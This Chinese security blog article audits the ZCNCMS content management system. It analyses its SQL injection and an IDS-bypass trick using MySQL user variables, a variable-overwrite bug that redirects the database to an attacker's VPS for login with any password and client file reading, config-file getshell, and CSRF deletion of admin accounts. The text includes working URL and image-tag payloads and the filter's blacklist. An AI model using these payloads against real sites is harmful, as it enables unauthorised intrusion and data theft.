> 原文链接: https://www.anquanke.com//post/id/179782 


# ZCNCMS审计及漏洞分析


                                阅读量   
                                **227469**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01deabbb9042d52667.png)](https://p2.ssl.qhimg.com/t01deabbb9042d52667.png)



## 前言

因为实际目标的需要审计了一下这个古老的CMS，接下来的内容将会包括本人发现漏洞代码及漏洞的利用过程、原有漏洞的细节分析、全局防SQL注入ids绕过细节分析等。



## 漏洞利用

先来看一下漏洞的利用效果

### <a class="reference-link" name="%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87ids"></a>后台SQL注入绕过ids

该cms比较古老，与之前的dedecms同样用了全局的08sec ids过滤sql注入，后面会详细分析绕过的方法原理（网上也有的，说一下自己见解）

首先是比较容易理解的payload:

[![](https://p5.ssl.qhimg.com/t01f3274e46d5d1407f.png)](https://p5.ssl.qhimg.com/t01f3274e46d5d1407f.png)

这里payload改为: and extractvalue(1,concat(0x7e,(database()),0x7e))也可，但利用受ids限制。

其次是绕过全局payload:

[![](https://p2.ssl.qhimg.com/t011c2e0b08191d80d7.png)](https://p2.ssl.qhimg.com/t011c2e0b08191d80d7.png)

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"></a>任意密码登录后台

外网vps安装mysql服务并开启允许远程访问，访问目标url。

eg: [http://localhost/zcncms/admin/?c=login&amp;db_host=vps_ip&amp;db_name=root&amp;db_pass=root&amp;db_table=zcncms](http://localhost/zcncms/admin/?c=login&amp;db_host=vps_ip&amp;db_name=root&amp;db_pass=root&amp;db_table=zcncms)

[![](https://p5.ssl.qhimg.com/t010ef8544043fd66fa.png)](https://p5.ssl.qhimg.com/t010ef8544043fd66fa.png)

[![](https://p2.ssl.qhimg.com/t016d1156b2195972cf.png)](https://p2.ssl.qhimg.com/t016d1156b2195972cf.png)

### <a class="reference-link" name="%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>客户端任意文件读取

以上的利用方法仅限于默认安装数据库，数据库名及表和列名都不变的情况。因此想到利用前段时间比较火的MySQL LOAD DATA LOCAL INFILE任意客户端文件读取。

[![](https://p0.ssl.qhimg.com/t01fc0936813dbee7e5.png)](https://p0.ssl.qhimg.com/t01fc0936813dbee7e5.png)

[![](https://p2.ssl.qhimg.com/t018a01b4f0961beca3.png)](https://p2.ssl.qhimg.com/t018a01b4f0961beca3.png)

其他漏洞如后台CSRF及后台getshell不放图了，下面具体分析一下这些漏洞成因及修复方法。



## 漏洞代码分析

分析的漏洞包括，SQL注入、变量覆盖、CSRF、修改配置文件getshell。

### <a class="reference-link" name="SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"></a>SQL注入漏洞

首先看漏洞产生的代码部分

```
//module/menus/admincontroller/menus.php
//第33行至63行
……
if($parentid == 0) `{`
    $rootid = 0;
    `}` else`{`
    $parent = $menus-&gt;GetInfo('',' id = '.$parentid);
    if($parent['parentid'] == 0) `{`
        $rootid = $parentid;
        `}` else`{`
            $rootid = $parent['rootid'];
    `}`
`}`
……
```

由于$parentid变量没有intval强制转换类型并且可控，因此漏洞发生。接下来分析绕过全局防注入ids。

```
//db.class.php
    function SafeSql($db_string,$querytype='select')`{`
        //var_dump($db_string);
        //完整的SQL检查
        //$pos = '';
        //$old_pos = '';
        $pos = 0;
        $old_pos = 0;
        $clean = '';
        if(empty($db_string))`{`
            return false;
        `}`
        while (true)`{`            
            $pos = strpos($db_string, ''', $pos + 1);
            if ($pos === false)
            `{`
                break;
            `}`
            $clean .= substr($db_string, $old_pos, $pos - $old_pos);
            while (true)
            `{`
                $pos1 = strpos($db_string, ''', $pos + 1);
                $pos2 = strpos($db_string, '\', $pos + 1);
                if ($pos1 === false)
                `{`
                    break;
                `}`
                elseif ($pos2 == false || $pos2 &gt; $pos1)
                `{`
                    $pos = $pos1;
                    break;
                `}`
                $pos = $pos2 + 1;
            `}`
            $clean .= '$s$';
            $old_pos = $pos + 1;
        `}`
        $clean .= substr($db_string, $old_pos);
        $clean = trim(strtolower(preg_replace(array('~s+~s' ), array(' '), $clean)));

        //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
        if (strpos($clean, 'union') !== false &amp;&amp; preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0)
        `{`
            $fail = true;
            $error="union detect";
        `}`

        //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
        elseif (strpos($clean, '/*') &gt; 2 || strpos($clean, '--') !== false || strpos($clean, '#') !== false)
        `{`
            $fail = true;
            $error="comment detect";
        `}`

        //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
        elseif (strpos($clean, 'sleep') !== false &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0)
        `{`
            $fail = true;
            $error="slown down detect";
        `}`
        elseif (strpos($clean, 'benchmark') !== false &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0)
        `{`
            $fail = true;
            $error="slown down detect";
        `}`
        elseif (strpos($clean, 'load_file') !== false &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0)
        `{`
            $fail = true;
            $error="file fun detect";
        `}`
        elseif (strpos($clean, 'into outfile') !== false &amp;&amp; preg_match('~(^|[^a-z])intos+outfile($|[^[a-z])~s', $clean) != 0)
        `{`
            $fail = true;
            $error="file fun detect";
        `}`

        //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
        elseif (preg_match('~([^)]*?select~s', $clean) != 0)
        `{`
            $fail = true;
            $error="sub select detect";
        `}`
        if (!empty($fail))
        `{`
            //fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$errorrn");
            exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;");
        `}`
        else
        `{`
            return $db_string;
        `}`
    `}`
```

代码的前部分简单来说就是获取两个单引号中的内容并替换为$s$，后部分获取$clean并根据waf规则进行黑名单检测。很明显如果我们可以使得payload被两个单引号包裹就可以绕过ids的检测，但是由于特殊字符会被转义，导致两个“’”引起报错无法执行payload。利用MySQL用户自定义变量的方法绕过转义报错。

在mysql中，“@”+字符串代表的是用户定义的变量。通过“:=”进行赋值，反引号仅作标识使用。

[![](https://p2.ssl.qhimg.com/t01e2da804c5d0e8f0c.png)](https://p2.ssl.qhimg.com/t01e2da804c5d0e8f0c.png)

因此当传入的参数中包含用户自定义的变量 “@`‘`”时，php处理时匹配到单引号进行替换$s$，带入ids检测，检测通过，payload进入mysql特殊字符无论怎么发生转义都不影响，比如“@`’`”同样仅仅代表一个名字为“’”的变量。

无码言x，直接看例子比较容易懂。

[![](https://p1.ssl.qhimg.com/t0148739973d19e0b3c.png)](https://p1.ssl.qhimg.com/t0148739973d19e0b3c.png)

可能返回这样的结果比较难以理解（我开始的确不怎么理解），那换一种语法应该就懂了。

[![](https://p4.ssl.qhimg.com/t018a2c424a6158a00b.png)](https://p4.ssl.qhimg.com/t018a2c424a6158a00b.png)

[![](https://p0.ssl.qhimg.com/t01b41f5e57b22d7a6c.png)](https://p0.ssl.qhimg.com/t01b41f5e57b22d7a6c.png)

可以发现，在mysql中where条件部分处理的逻辑顺序是，先将所有id与1比对，相同返回1，1与后面的变量@`anquanke`进行比较，相同则返回1。同样的道理id=1=`qq`是id=1返回的结果与字段qq中的值进行比较，这里存在类型转换（0=’admin’）。至于@`’`无返回结果，因为该变量用户并没有定义所以不存在为NULL。

至此，利用该特性绕过SQL注入检测机制。（另：任何运算符都可达到同样效果。）

### <a class="reference-link" name="%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"></a>变量覆盖

```
//index.php
error_reporting(E_ALL | E_STRICT);

define('WEB_IN', '1');
define('WEB_APP','admin');
define('WEB_ROOT', dirname(__FILE__).'/');
define('WEB_INC', WEB_ROOT.'../include/');
define('WEB_MOD', WEB_INC.'model/');
define('WEB_TPL',WEB_ROOT.'templates/default/');
define('WEB_DATA',WEB_ROOT.'../data/');
define('WEB_CACHE',WEB_ROOT.'../data/cache/');
define('WEB_MODULE', WEB_ROOT.'../module/');
//引入common
//echo WEB_APP;
require_once(WEB_INC.'/common.inc.php');
// var_dump($db_type,$db_host,$db_name,$db_pass,$db_table,$db_ut,$db_tablepre);
$config['linkurlmodeadmin'] = $config['linkurlmode'];
$config['linkurlmode'] = 0;
//include(WEB_INC.'forbiddenip.inc.php');
//include(WEB_INC.'close.inc.php');
include(WEB_INC.'rootstart.inc.php');
```

包含了common.inc.php文件，直接看该文件的导致变量覆盖的代码部分。

```
//56-81行
//引入配置文件 20120726解决方案，数据库类型
require(WEB_INC.'/config.inc.php');

//foreach(Array('_GET','_POST','_COOKIE') as $_request) 取消cookie自动生成变量
foreach(Array('_GET','_POST') as $_request)
`{`
    foreach($$_request as $_k =&gt; $_v) `{`
        //------------------20130128校验变量名
        if(strstr($_k, '_') == $_k)`{`
            echo 'code:re_all';
            exit;
        `}`
        //可考虑增加变量检测，减少变量覆盖
        //--------------------------
        $`{`$_k`}` = _GetRequest($_v);
    `}`
`}`
//unset($_GET,$_POST);

//时区
if(PHP_VERSION &gt; '5.1')
`{`
    @date_default_timezone_set('PRC');
`}`

//引入配置文件
require(WEB_INC.'/config.inc.php');
```

可以通过get或post方式传参覆盖掉没有初始化的变量。在代码56,81行处开始，可以发现分别包含了config.inc.php文件，漏洞产生的根本原因在该文件。

```
//config.inc.php
&lt;?php
//默认配置文件
//数据库
defined( 'WEB_IN' ) or die( 'Restricted access' );
require_once('dataconfig.inc.php');
/* 
$db_type='2';
$host='localhost';
$name='root';
$pass='';
$table='pj_zcncms';
$tablepre='';
$ut='utf8'; 
*/
```

这里使用require_once包含了dataconfig.inc.php文件，由于require_once的特性，第二次包含并不起作用，并且变量覆盖产生在第一次包含config文件之后，所以我们成功的覆盖掉了数据库配置文件变量，导致了任意用户后台登录以及任意客户端文件读取漏洞。

### <a class="reference-link" name="%E5%90%8E%E5%8F%B0getshell"></a>后台getshell

```
//include/string.class.php  35-62行
function safe($msg)
    `{`
        if(!$msg &amp;&amp; $msg != '0')
        `{`
            return false;
        `}`
        if(is_array($msg))
        `{`
            foreach($msg AS $key=&gt;$value)
            `{`
                $msg[$key] = $this-&gt;safe($value);
            `}`
        `}`
        else
        `{`
            $msg = trim($msg);
            //$old = array("&amp;amp;","&amp;nbsp;","'",'"',"t","r");
            //$new = array("&amp;"," ","'","&amp;quot;","&amp;nbsp; &amp;nbsp; ","");
            $old = array("&amp;amp;","&amp;nbsp;","'",'"',"t");
            $new = array("&amp;"," ","'","&amp;quot;","&amp;nbsp; &amp;nbsp; ");
            $msg = str_replace($old,$new,$msg);
            $msg = str_replace("   ","&amp;nbsp; &amp;nbsp;",$msg);
            $old = array("/&lt;script(.*)&lt;/script&gt;/isU","/&lt;frame(.*)&gt;/isU","/&lt;/fram(.*)&gt;/isU","/&lt;iframe(.*)&gt;/isU","/&lt;/ifram(.*)&gt;/isU","/&lt;style(.*)&lt;/style&gt;/isU");
            $new = array("","","","","","");
            $msg = preg_replace($old,$new,$msg);
        `}`
        return $msg;
    `}`
```

后台修改配置处过滤的核心代码如上所示，可以利用反斜线转义引号，插入php代码成功getshell。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010f2047ce9e4a7d95.png)

### <a class="reference-link" name="CSRF%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%88%A0%E9%99%A4"></a>CSRF任意管理员账户删除

```
//users.php
switch($a)
`{`

    ......

    case 'del'://
        $ids = array();
        if(isset($id))`{`
            if(is_array($id))`{`
                $ids = $id;
            `}` else `{`
                $ids[] = $id;
            `}`

        `}` else `{`
            errorinfo('变量错误','');
        `}`
        foreach($ids as $key=&gt;$value)`{`
            $value = intval($value);
            if($value &lt;= 0)`{`
                    errorinfo('变量错误','');
            `}`
        `}`
        if($users-&gt;Del($ids))`{`
            errorinfo('删除成功','');
        `}`else`{`
            errorinfo('删除失败','');
        `}` 
        break;

    ......

`}`
```

通过get方式传参，并且没有验证referer和token。简单利用如下：

```
//payload
&lt;img src="http://localhost/zcncms-1.2.14/zcncms/admin/?c=users&amp;a=del&amp;id=12" &gt;
```



## 总结

一定还存在其他漏洞，但是考虑时间和利弊就暂时审计这些，起初目的就是找个进后台的办法，已经实现即可。审计和学习已有漏洞时遇到的最大问题是，当时对SQL注入ids绕过存在很多细节性的问题，还好在写文章时想通了。
